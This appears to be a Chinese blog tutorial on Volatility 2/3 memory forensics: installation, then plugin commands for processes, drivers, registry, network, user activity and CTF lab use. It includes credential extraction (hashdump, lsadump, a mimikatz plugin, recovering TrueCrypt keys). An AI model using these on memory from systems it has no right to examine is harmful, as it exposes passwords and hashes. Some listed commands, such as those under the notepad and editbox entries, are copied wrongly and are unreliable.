https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py 2.运行脚本：\nsudo python2 get-pip.py 3.检查是否安装成功：\npip2 -V 成功显示出pip的版本号，以及它关联的是Python 2.7，就说明已经成功为安装好了pip2\n4.安装virtualenv：\n安装的版本必须是兼容python2的，直接安装可能会下载到python3的版本，所以要指定版本：\npip2 install \u0026#34;virtualenv\u0026lt;20\u0026#34; 如果是volatility3，也就是基于python3的版本，就可以使用apt直接下载对应的venv工具\n先更新，后下载：\nsudo apt update apt install python3-venv 这样就完成了安装\n创建 python2：\npython2 -m virtualenv 虚拟环境名 python3：\npython3 -m venv 虚拟环境名 使用 source 虚拟环境名/bin/activate 提示符前面会多一个(虚拟环境名)的标记，之后的所有python和pip命令都只作用在此环境下\n分享依赖 这条命令会将当前环境中所有已安装的库及其版本号写入到requirements.txt中：\npip freeze \u0026gt; requirements.txt 如果别人需要用，只需创建一个新的虚拟环境，再运行：\npip install -r requirements.txt 通常我们也是使用这个命令来下载对应工具需要的依赖\n退出 deactivate 删除 rm -rf 虚拟环境名 设置为系统级命令 编写启动脚本 vim /usr/local/bin/vol 向里面写入下面内容：\n#!/bin/bash source /home/kali/volatility2/venv_volatility2/bin/activate \u0026amp;\u0026amp; python /home/kali/volatility2/vol.py \u0026#34;$@\u0026#34; \u0026amp;\u0026amp;的意思是：如果前一个命令成功，则执行后一个命令\n前者是启动虚拟环境，要写对应创建的虚拟环境路径\n后者是把所有参数传递给volatility脚本，要写对应的vol.py路径\n给脚本添加启动权限 sudo chmod +x /usr/local/bin/vol 这样就设置完成了，如果不行，就刷新一下命令缓存再运行：\nhash -r 报错解决 缺少运行库 换了两个虚拟机，每次运行volatility2的时候都会遇到库pycryptodome和distorm3不存在的问题\n这种情况只要进入对应虚拟环境，然后安装缺少的库即可\nsource /home/kali/volatility2/venv_volatility2/bin/activate pip2 install pycryptodome pip2 install distorm3 deactivate 安装插件 volatility2历史悠久，社区也很强大，很多人开发了非常好用的插件，需要我们手动安装\n这里以mimikatz插件为例，具体的下载地址网上一搜就有\n下载插件，这里使用wget，其他方式随意：\nwget https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso/mimikatz.py 移动到存放插件的目录，一般是volatility2/volatility/plugins/：\nmv mimikatz.py /home/kali/volatility2/volatility/plugins/ 之后就可以使用了，不过mimikatz使用还需要安装依赖，具体看mimikatz Volatility常用命令 系统画像 查看系统信息（imageinfo/info） Volatility2 这是vol2进行任何分析前必须执行的第一步，用于确定操作系统的Profile，即版本\nvol2 -f \u0026lt;内存镜像\u0026gt; imageinfo \u0026lt;内存镜像\u0026gt;的后缀名没有固定的，可能是raw，dump，img，vmem等等\nSuggested Profile(s)：建议的配置文件\n在后续执行所有其他插件时，都需要通过 --profile=\u0026lt;profile_name\u0026gt; 参数从这个列表中选择一个来使用\n通常，选择列表中的第一个（Win7SP1x64）就是最合适的\nKDBG：内核调试块地址\n用于定位其他所有系统信息，如进程列表、驱动列表等\nImage date and time：镜像日期和时间，世界标准时间零时区UTC＋0\n这里表明内存快照是在UTC时间2019年12月20日03:47:57被创建\nImage local date and time：原始机器当时的本地时间，包含时区信息\n03:47:57加上5小时30分钟，正好等于09:17:57，这就是当地的时间\nNumber of Processors：处理器数量\n这里显示该系统是单核处理器\nVolatility3 V3会自动检测Profile，之后的命令无需手动输入，此命令用于显示详细的信息\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.info.Info NTBuildLab：Windows操作系统构建版本标签\n7601.17514.amd64fre.win7sp1_rtm，代表一个经过后续更新（修订号17514）的、面向64位amd架构的、已正式发布的、基于Windows7SP1开发分支的操作系统\nKeNumberProcessors：处理器个数\nSystemTime：内存快照被制作的时间，世界标准时间零时区UTC＋0\nNtProductType： Windows操作系统的产品类型\nNtProductWinNt：客户端版本\nNtProductServer：服务器\nNtProductLanManNt：域控制器，是特定类型的服务器\nNtMajorVersion / NtMinorVersion：Windows操作系统内核的主版本号和次版本号\n6.1在WindowsNT内核版本中，对应着Windows7或WindowsServer2008R2\nPE TimeDateStamp：系统内核文件被编译的时间\n查看文件信息（mftparser/mftscan） 除了Volatility，还可以使用其他工具导出mft记录：https://github.com/jschicht/Mft2Csv/releases\n下载打开软件，选择$MFT文件，然后导出到csv文件即可，导出的条目会以csv文件的形式存放在软件目录下\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; mftparser MFT entry found at offset \u0026hellip;：该MFT记录在内存中的物理偏移地址\nAttribute:In Use \u0026amp; File：表明这是一条活动的、描述文件的记录\nRecord Number：该记录在MFT中的唯一编号\nLink count：指向这个文件实体的文件名数量（硬链接数）\n$STANDARD_INFORMATION：主属性，只有当文件内容被编辑时，其Modified和Updated时间才会改变\n$FILE_NAME：文件名属性，文件内容被改动、重命名、移动时，其Modified和Updated时间都会改变\nCreation：创建时间\nModified：修改时间\nMFT Altered：MFT记录本身最后一次被修改的时间，例如文件名或权限变更\nAccess Date：文件内容最后一次被访问的时间（注意：在现代Windows系统中，为提高性能，这个时间戳不一定总是实时更新）\nName/Path：显示具体的文件名\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.mftscan.MFTScan Offset ：偏移量\n这是该 MFT 记录在内存中的虚拟地址\nRecord Type：记录类型\n指明该记录是用于一个文件（FILE）还是一个目录（Directory）\nRecord Number：记录编号\n这是该文件/目录在整个 MFT 中的唯一索引号\nLink Count：链接计数\n表示有多少个文件名指向这个相同的文件实体\n例如，值为2意味着这个文件有两个名字，通常一个是长文件名，一个是8.3格式的短文件名\nMFT Type：MFT类型\n进一步描述MFT条目的类型，通常与Record Type一致\nPermissions：权限属性\n显示文件的属性，如 Archive (存档)、System (系统文件)等\nAttribute Type：属性类型\n指明当前这一行显示的是 MFT 记录中的哪一种具体属性\nSTANDARD_INFORMATION：主属性，只有当文件内容被编辑时，其Modified和Updated时间才会改变\nFILE_NAME：文件名属性，文件内容被改动、重命名、移动时，其Modified和Updated时间都会改变\n最前面带星号的行是隶属于它上面那个不带星号的主记录的子属性\nCreated, Modified, Updated, Accessed：四种时间戳\n分别代表了该属性（STANDARD_INFORMATION 或 FILE_NAME）的：\n创建时间、修改时间、MFT记录更新时间、访问时间（以UTC标准时间显示）\nFilename：文件名\n当 Attribute Type 为 FILE_NAME 时，这一列会显示具体的文件名\n查看windows服务（svcscan） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; svcscan Service Name：服务的内部名称\nDisplay Name：服务的显示名称，在服务管理器中的名称\nProcess ID：该服务的进程的ID\nService State： 服务状态，表明服务是RUNNING(正在运行) 还是STOPPED(已停止)\nBinary Path：服务路径\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.svcscan.SvcScan Offset：偏移量\n这是该服务记录在内存中的虚拟地址\nOrder：顺序\n服务在其服务组内的加载顺序编号\nPID：进程ID\n如果该服务当前正在运行，这里会显示托管它的进程的ID，如果服务已停止，则显示为 N/A\nStart：启动类型\n这是在注册表中为该服务配置的启动方式，决定了它如何被启动，有下面几种：\nSERVICE_BOOT_START：引导启动\nSERVICE_SYSTEM_START：系统启动\nSERVICE_AUTO_START：自动启动\nSERVICE_DEMAND_START：按需启动 (手动)\nSERVICE_DISABLED：已禁用\nState：当前状态\n表示在捕获内存时该服务的实时状态，有下面这几种：\nSERVICE_STOPPED：服务已停止\nSERVICE_START_PENDING：服务正在启动\nSERVICE_STOP_PENDING：服务正在停止\nSERVICE_RUNNING：服务正在运行\nSERVICE_CONTINUE_PENDING：服务即将继续\nSERVICE_PAUSE_PENDING：服务即将暂停\nSERVICE_PAUSED：服务已暂停\nType：服务类型\n描述了该服务的性质，有下面几种：\nSERVICE_KERNEL_DRIVER：内核模式驱动程序\nSERVICE_FILE_SYSTEM_DRIVER：文件系统驱动程序\nSERVICE_WIN32_OWN_PROCESS：独立进程Win32服务\nSERVICE_WIN32_SHARE_PROCESS：共享进程Win32服务\nSERVICE_INTERACTIVE_PROCESS：交互式服务，由于安全原因，这个服务已经被弃用\nName：服务名\n服务的短名称或内部名称\nDisplay：显示名称\nWindows服务管理器中看到的人类可读的名称\nBinary：二进制/运行命令\n这是启动该服务进程时实际使用的命令行\n对于共享服务，这里通常会包含-k \u0026lt;服务组名\u0026gt;参数，例如C:\\Windows\\system32\\svchost.exe -k DcomLaunch\nBinary (Registry)：注册表中的二进制路径\n这是在注册表中为该服务配置的ImagePath值\nDll：服务DLL\n如果该服务是由一个DLL实现并由svchost.exe托管的，这里会显示该 DLL 的路径\n查看驱动模块（modules/driverscan/modscan） Volatility2 使用modules来查看驱动模块，通过遍历内核中的PsLoadedModuleList官方链表来获取信息：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; modules Offset(V)：该模块的_LDR_DATA_TABLE_ENTRY结构在内存中的虚拟地址 Name：模块的名称，例如 ntoskrnl.exe Base：模块被加载到内存中的基地址 Size：模块在内存中所占空间的大小 File：该模块对应的磁盘文件路径 或者也可以使用driverscan通过扫描内存池来寻找驱动对象，这种方式能发现一部分隐藏的驱动对象：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; driverscan Offset(P)：该驱动对象在内存中的物理地址 #Ptr：指向该驱动对象的指针数量 #Hnd：该驱动对象的句柄数量 Start：驱动程序在内存中的起始地址 Size：驱动程序在内存中所占空间的大小 Service Key：该驱动在注册表服务项中的名称，这通常与驱动名相同 Name：驱动的名称 Driver Name：驱动对象在系统中的完整名称，通常以\\Driver\\或\\FileSystem\\开头 还可以使用modscan扫描模块结构特征寻找驱动，最全面，能发现大多数隐藏模块速度慢，但可能有误报：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; modscan 物理地址不同是正常的，因为它们扫描和定位的目标数据结构不同\nVolatility3 使用modules：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.modules.Modules 使用driverscan：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.driverscan.DriverScan 使用modscan：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.modscan.ModScan 查看驱动程序的IRP（driverirp） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; driverirp DriverName：目标驱动的名称\n第一列：IRP功能码的编号\n第二列：IRP功能码的名称，描述了I/O请求的类型，例如：\nIRP_MJ_CREATE：当有程序尝试创建或打开文件时，会产生这个请求 IRP_MJ_READ：读取文件请求 IRP_MJ_WRITE：写入文件请求 IRP_MJ_DEVICE_CONTROL：设备控制请求 第三列：处理该IRP请求的函数在内存中的实际地址\n第四列：该函数地址所属的内核模块\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.driverirp.DriverIrp Offset：该驱动对象在内存中的虚拟地址 Driver Name：驱动对象的名称 IRP：IRP的主要功能码，代表了驱动程序注册要处理的I/O操作类型，例如： IRP_MJ_CREATE：文件或设备创建/打开请求 IRP_MJ_CLOSE：文件或设备关闭请求 IRP_MJ_READ：读取请求 IRP_MJ_WRITE：写入请求 IRP_MJ_DEVICE_CONTROL：设备控制请求，是驱动程序功能的主要入口 IRP_MJ_INTERNAL_DEVICE_CONTROL：内部设备控制请求 IRP_MJ_PNP：即插即用相关的请求 Address：处理该类型IRP请求的函数在内存中的实际地址 Module：该函数地址所属的内核模块（驱动文件） Symbol：具体的函数名 查看内核回调（callbacks） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; callbacks Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.callbacks.Callbacks Type：回调类型\n当这类事件发生时，内核会调用所有注册在此的回调函数，例如：\nPspCreateProcessNotifyRoutine: 当一个新进程被创建时触发 PspLoadImageNotifyRoutine: 当一个可执行文件或DLL被加载到内存时触发 KeBugCheckCallbackListHead: 当系统发生蓝屏崩溃时触发 Callback：回调函数地址\nModule：所属模块\n它指明了这个回调函数属于哪个内核模块，即驱动程序\n在正常情况下，这里应该都是ntoskrnl（内核自身）或已知的、合法的硬件驱动程序（如tcpip,ndis等）\nSymbol：回调函数的具体名称\nDetail：补充说明\n查看系统调用（ssdt） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; ssdt Entry：SSDT 表中的索引号（入口点编号），以十六进制表示 Address：该索引号对应的内核函数在内存中的实际地址 owned by：指明了这个函数地址属于哪个内核模块 如果一个函数的Owner不是 ntoskrnl.exe或win32k.sys，而是另一个可疑的驱动，或者显示为 (unknown)，就意味着该函数很可能已被挂钩（Hook），指向了恶意的函数\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.ssdt.SSDT Index：SSDT 表中的索引号（入口点编号） Address：该索引号对应的内核函数在内存中的实际地址 Module：指明了这个函数地址属于哪个内核模块 Symbol：该内核函数的具体名称 查看符号链接（symlinkscan） 通过扫描内存以寻找并打印出_OBJECT_SYMBOLIC_LINK结构，列出系统内核中存在的符号链接及其指向的目标\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;配置文件\u0026gt; symlinkscan 输出字段详解 Offset(P)：该符号链接对象（_OBJECT_SYMBOLIC_LINK 结构）在内存中的物理地址 #Ptr：指向该符号链接对象的指针数量 #Hnd：该符号链接对象的句柄数量 Creation time：该符号链接被创建的时间戳（以UTC标准时间显示） From：这是符号链接自身的名称，可以理解为“快捷方式”的名字 To：这是该符号链接实际指向的目标对象的名称，可以理解为“快捷方式”指向的“真实文件”的路径 Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.symlinkscan.SymlinkScan Offset：该符号链接对象（_OBJECT_SYMBOLIC_LINK 结构）在内存中的虚拟地址 CreateTime：该符号链接被创建的时间戳（以UTC标准时间显示） From Name：这是符号链接自身的名称，可以理解为“快捷方式”的名字 To Name：这是该符号链接实际指向的目标对象的名称，可以理解为“快捷方式”指向的“真实文件”的路径 进程分析 查看进程列表（pslist/psscan） Volatility2 仅查看显式进程：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; pslist 查看包括隐藏进程在内的进程：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; psscan Offset(V)：进程对象在内存中的虚拟地址 Name：进程的映像文件名（通常是.exe文件名） PID：进程ID，每个进程唯一的身份编号 PPID：父进程ID，即启动这个进程的那个进程的ID Thds：线程数，该进程拥有的线程数量 Hnds：句柄数，该进程打开的句柄数量 Sess：会话ID，用于区分不同的用户登录会话 Wow64：如果为 True，表示一个32位进程运行在64位系统上 Start：进程的创建时间 Exit：进程的退出时间（如果进程已终止） Volatility3 仅查看显式进程：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.pslist.PsList\t查看包括隐藏进程在内的进程：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.psscan.PsScan\tPID：进程ID PPID：父进程ID，即启动这个进程的那个进程的ID\nImageFileName：进程的映像文件名，通常是.exe文件名\nOffset(V)：进程对象在内存中的虚拟地址\nThreads：线程数，该进程拥有的线程数量\nHandles：句柄数，该进程打开的句柄数量\nSessionID：会话ID\nWow64：如果为 True，表示一个32位进程运行在64位系统上\nCreatTime：进程的创建时间\nExitTime：如果进程已终止，显示进程的退出时间\nFile output：是否已经被导出（dump）\n查看进程父子关系（pstree） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; pstree 区分父子进程：\nwininit.exe：行首没有点，它是这个分支的顶级进程\nservices.exe：行首有 1个点，它位于 wininit.exe（0个点）的下方，所以 services.exe 是 wininit.exe 的子进程\nTCPSVCS.EXE：行首有 2个点，它位于 services.exe（1个点）的下方，所以 TCPSVCS.EXE 是 services.exe 的子进程\n当一个进程的父进程ID（PPID）比它自身的进程ID（PID）还要大时，很可能有问题\nVolatility3 vol3 vol.py -f \u0026lt;内存镜像\u0026gt; windows.pstree.PsTree 与volatility2不同，3使用*来区分父子进程，*越多，代表进程的层级越深，是更深层的子进程\nPath：每个进程可执行文件在硬盘上的完整路径 Cmd：启动该进程时使用的完整命令行参数 发现隐藏进程（psxview） 恶意进程一般会隐藏自身，而人工对比pslist和psscan又太麻烦太不可靠\n可以使用psxview对比各个扫描方式，寻找隐藏进程\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; psxview 过滤带有false的项目，可以很快看出哪些进程隐藏了自身（主要看第一个pslist和第二个psscan）：\nVolatility3 python3 vol.py -f \u0026lt;内存镜像\u0026gt; windows.malware.psxview.PsXView 过滤False项：\n查看进程启动参数（cmdline） 能看到进程如何被创建的，包括命令行启动和exe文件点击启动\n但看不到进程内部的交互，不知道进程干了什么\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; cmdline Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.cmdline.CmdLine 查看进程加载的DLL（dlllist） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; dlllist -p 进程pid Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.dlllist.DllList --pid 进程pid 相较于vol2，vol3还给出了dll的加载时间LoadTime：\n查看进程权限（privs） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; privs Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.privileges.Privs 查看进程对应用户SID（getsids） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; getsids Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.getsids.GetSIDs 相较于Volatility2，这个输出更加规范化：\nPID：进程ID\nProcess：进程名\nSID：安全标识符的字符串表示\nName：该 SID 对应的通用名称\n一个进程会对应多个SID，是因为一个进程的访问令牌中，不仅包含了其主要运行身份的SID，还包含了该身份所属的所有用户组的SID，这些SID共同决定了该进程的权限\n例如，System(PID:4)这个进程，它关联了多个SID：\nS-1-5-18 (Local System)：这是它的主身份，代表了系统的最高权限 S-1-5-32-544 (Administrators)：表明它也属于管理员组 S-1-1-0 (Everyone)：表明它也属于Everyone组 查看可能的恶意代码（malfind） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; malfind volatility2还有一个社区插件，是malfind的深度扫描版本malfinddeep：\nhttps://github.com/superponible/volatility-plugins vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; malfinddeep Volatility3 vol3 -f MemoryDump_Lab5.raw windows.malware.malfind.Malfind 提取进程内存（memdump/\u0026ndash;dump） 进程内存中潜藏着很多信息，把他们提取出来才能更好的做分析\n比如TrueCrypt进程中会有加密密钥，导出其为.dmp文件后，可以交给EFDD解密加密卷\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; memdump -p \u0026lt;PID\u0026gt; -D \u0026lt;保存路径\u0026gt; 提取后的文件为.dump，存储了进程所有的数据，可以在里面搜索目标字符串等\n如果进程里有想要的文件，可以使用foremost分离文件\n如果目标比较明显（比如图片），也可以用mv命令修改文件后缀再打开，再在里面找目标文件\nVolatility3 vol3不再有单独的dump插件，直接在PsList插件使用--dump选项：\nvol3 -f \u0026lt;内存镜像\u0026gt; -o \u0026lt;保存路径\u0026gt; windows.pslist.PsList --pid \u0026lt;PID\u0026gt; --dump 这里的-o选项用于指定导出文件的路径，必须放在-f选项后一个！！\n网络活动分析 查看网络连接（netscan/netstat） Volatility2 查看当前以及历史、隐藏网络链接（这个是XP时代的工具了，很老，不一定有用）：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; connscan 查看当前网络链接：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; netscan LISTENING：表示某个程序正在一个端口上“监听”，等待外部连接的建立\nESTABLISHED：表示一个 TCP 连接已经成功建立，双方正在进行数据通信\nCLOSED/TIME_WAIT/SYN_SENT：表示各种已关闭或正在建立/关闭过程中的连接状态\nUDP 是无连接的协议，所以它没有 State（状态）字段 我们可以从中筛选已经建立链接的项：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; netscan | grep ESTABLISHED 如果当前系统中存在挖矿进程，网络连接列表又太长，就可以借此筛选，获取到矿池地址\n或者也可以根据提供的pid把它dump下来具体分析\nVolatility3 更加建议使用NetStat，报告更赏心悦目：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.netstat.NetStat 当然，vol3也是有NetScan的：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.netscan.NetScan 注册表分析 查看注册表整体结构（hivelist） hivelist的主要作用是为后续的printkey等插件提供每个Hive的虚拟地址（第一列）\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; hivelist ntuser.dat：用户的注册表文件，这里表明Alissa Simpson和SmartNet是登录状态或近期登录过\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.registry.hivelist.HiveList 查看具体注册表项（printkey） Volatility2 使用逻辑路径：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; printkey -K \u0026#34;顶层路径\\子路径\u0026#34; 一定是从对应的hive开始，比如SAM，SECURITY等，而不是那五个根键：\n也可以使用虚拟地址：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; printkey -o 虚拟地址 再根据结果返回的SubKeys使用-K参数：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; -o 虚拟地址 printkey -K \u0026#34;子键名称\u0026#34; Volatility3 vol3只指定路径会去所有hive中寻找，需要使用逻辑路径＋虚拟地址才能精确定位：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.registry.printkey.PrintKey --offset 虚拟地址 --key \u0026#34;顶层路径\\子路径\u0026#34; 用户活动与执行历史 查看cmd历史命令（cmdscan） 输出干净，有时能找到超出缓冲区范围的命令，即使已经清屏\n但没有命令的输出结果，且只限于cmd\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; cmdscan Application：DumpIt.exe：Volatility在内存中定位到的这个命令历史记录区是属于DumpIt.exe的\n这里cmdcount=0，说明没有发现cmd命令\nDumpIt.exe是于快速创建物理内存完整转储的工具，也就是创建这个\u0026lt;内存镜像\u0026gt;用的\nVolatility3 vol3对于win7等老系统可能不支持，分析会报错，使用时注意\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.cmdscan.CmdScan 1.概览信息\nPID Process ConsoleInfo Property Address Data 2084 conhost.exe 0x1445c89b900 _COMMAND_HISTORY 0x1445c89b900 None 这部分告诉我们，在 PID 为2084的conhost.exe进程中，于内存地址0x1445c89b900处，找到了一个_COMMAND_HISTORY（命令历史）的数据结构\n2.历史记录的元数据\n下面几行带单个*的是这个历史记录本身的属性：\n* 2084 conhost.exe ... _COMMAND_HISTORY.Application ... cmd.exe * 2084 conhost.exe ... _COMMAND_HISTORY.CommandCount ... 3 * 2084 conhost.exe ... _COMMAND_HISTORY.CommandCountMax ... 50 Application：cmd.exe：表明这个命令行窗口的应用程序是cmd.exe CommandCount：3：它表示在这个命令历史缓冲区中，一共记录了3条命令 CommandCountMax：50：表示这个缓冲区最多可以记录50条命令 3.恢复出的命令内容\n下面带两个星号**的部分是用户输入过的命令：\n** 2084 conhost.exe ... CommandBucket_Command_0 ... ping easyforensics.com ** 2084 conhost.exe ... CommandBucket_Command_1 ... ipconfig ** 2084 conhost.exe ... CommandBucket_Command_2 ... ping easyforensics.com CommandBucket_Command_X：代表历史记录缓冲区中的第 X 个槽位 Data 列：清晰地显示了用户按顺序输入的三条命令： ping easyforensics.com ipconfig ping easyforensics.com 查看控制台完整交互（consoles） consoles不仅能看到输入的命令，还能看到命令返回的输出结果，只要是conhost.exe控制的交互式窗口(cmd、poweshell等)就能提取\n但它受缓冲区大小限制，只寻找当前屏幕缓冲区的内容，如果清屏了(cls)就找不到了\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; consoles Volatility3 vol3对于win7等老系统可能不支持，分析会报错，使用时注意\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.consoles.Consoles 此处显示未找到控制台信息\u0026quot;Console Information Not Found\u0026quot;\n查看GUI程序执行记录（userassist） 展示用户通过GUI启动的程序（点击快捷方式、开始菜单等）的信息，证明用户的主动操作行为\n它只记录explorer.exe，不接受cmd.exe/powershell.exe，不能看见用户通过命令行启动的程序\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; userassist Registry：...\\ntuser.dat：个人注册表配置文件，用户为Alissa Simpson\nREG_BINARY：程序名称\nCount：程序启动次数\nFocus Count：程序点击次数（焦点）\nLast Update：最后一次使用记录\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.registry.userassist.UserAssist 查看程序准备记录（shimcache/shimcachemem） 记录任何准备执行的程序（包括后台服务、被浏览的文件等，不一定真的运行了）\n它甚至能记录已被删除的程序的执行痕迹\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; shimcache Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.shimcachemem.ShimcacheMem 查看剪贴板内容（clipboard） volatility3没有此功能\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; clipboard 除了使用volatility2之外，也可以查看ActivitiesCache.db数据库\n从Windows10版本1803开始，ActivitiesCache.db就开始记录剪贴板活动了，不过前提是要打开下面的设置：\n随后，在下面的路径找到ActivitiesCache.db：\nC:\\Users\\\u0026lt;username\u0026gt;\\AppData\\Local\\ConnectedDevicesPlatform\\ 使用数据库链接后，使用它自带的SmartLookup视图：\n这里我的ClipboardPayload字段为空，是因为我没有打开剪贴板历史记录，嘻嘻\n查看窗口图像（screeenshot） 从内存中提取窗口图像甚至恢复桌面画面，截图内容通常是窗口的客户区域，不是全屏桌面\n需要安装Pillow库：\nsource /home/kali/volatility2/venv_volatility2/bin/activate pip2 install Pillow deactivate 使用的同时必须指定保存路径（\u0026ndash;dump-dir=）：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; screenshot --dump-dir=保存路径 文件名 含义 session_0 会话 0，表示本地物理桌面用户或服务（如 SYSTEM） WinSta0 用户交互的窗口站（Window Station），默认GUI桌面就在这里 Default 当前活动桌面 Winlogon 登录界面桌面，可能在锁屏状态时显示 Disconnect 断开连接时显示的桌面（比如远程桌面断开） Service-0x0-3e7$ 代表SYSTEM服务账户的窗口站 mssrestricteddesk 某些安全子系统（如 Speech 或 Office 隔离）的沙盒桌面 比如我这里获得的一张当时的屏幕截图session_2.WinSta0.Default.png，说明用户在查看一张图片：\n图片名base64解码就是flag：flag{!!_w3LL_d0n3_St4g3-1_0g_L4B_5_D0n3_!!}\n查看记事本中的内容（notepad） 本质是扫描记事本进程notepad.exe，还原的是正在显示和编辑的内容\nvolatility3没有此功能\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; iehistory 查看用户可能编辑的内容（editbox） 它比notepad插件更加通用，不只针对记事本，而是扫描所有进程的内存，寻找所有编辑控件并提取文本\nvolatility3没有此功能\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; iehistory 查看ie浏览器历史记录（iehistory） volatility3没有此功能\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; iehistory 查看chrome浏览器历史记录（chromehistory） volatility3没有此功能\n需要下载插件chromehistory和sqlite_help：\nhttps://github.com/superponible/volatility-plugins/blob/master vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; chromehistory 查看firefox浏览器历史记录（firefoxhistory） volatility3没有此功能\n需要下载插件firefoxhistory和sqlite_help：\nhttps://github.com/superponible/volatility-plugins/blob/master vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; firefoxhistory 根据历史记录，我们可以去内存中查找是否有对应的文件：文件扫描与提取 查看已安装的软件（uninstallinfo） volatility3没有此功能\n需要下载插件uninstallinfo：\nhttps://github.com/superponible/volatility-plugins/blob/master vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; uninstallinfo 查看查入系统的USB设备（usbstor） volatility3没有此功能\n需要下载插件usbstor：\nhttps://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; usbstor 密码和凭证获取（仅volatility2） volatility3没有下面的功能\n提取本地账户哈希（hashdump） 使用SYSTEM里面的SYSKEY提取SAM中的密码哈希\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; hashdump 输出格式是：\n[用户名]:[RID]:[LM哈希]:[NTLM哈希]::: 提取LSA密钥（lsadump） lsa是本地安全机构，通过它可以获取当前登录用户、服务账户等多种形式的凭证，甚至可能是明文密码\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; lsadump 